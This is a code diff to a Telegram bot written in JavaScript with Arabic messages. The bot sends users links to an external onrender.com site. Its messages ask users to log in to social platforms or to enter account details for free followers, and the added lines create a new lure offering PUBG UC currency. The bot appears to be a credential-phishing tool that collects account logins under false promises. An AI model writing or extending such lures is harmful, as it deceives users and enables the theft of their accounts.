@@ -885,9 +885,16 @@ bot.on('message', (msg) => {
 
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
-    const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
+    const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
-    const [action, platform] = query.data.split('_');
+    let action, platform;
+    if (query.data === 'pubg_uc') {
+        action = 'pubg';
+        platform = 'uc';
+    } else {
+        [action, platform] = query.data.split('_');
+    }
+
     const url = `${baseUrl}/${action}/${platform}/${chatId}`;
 
     let message;
@@ -895,6 +902,8 @@ bot.on('callback_query', (query) => {
         message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
     } else if (action === 'increase') {
         message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
+    } else if (action === 'pubg' && platform === 'uc') {
+        message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
     } else {
         message = 'عملية غير معروفة';
     }
@@ -910,7 +919,8 @@ function getPlatformName(platform) {
         snapchat: 'سناب شات',
         pubg: 'ببجي',
         youtube: 'يوتيوب',
-        twitter: 'تويتر'
+        twitter: 'تويتر',
+        uc: 'شدات ببجي'
     };
     return platformNames[platform] || platform;
 }
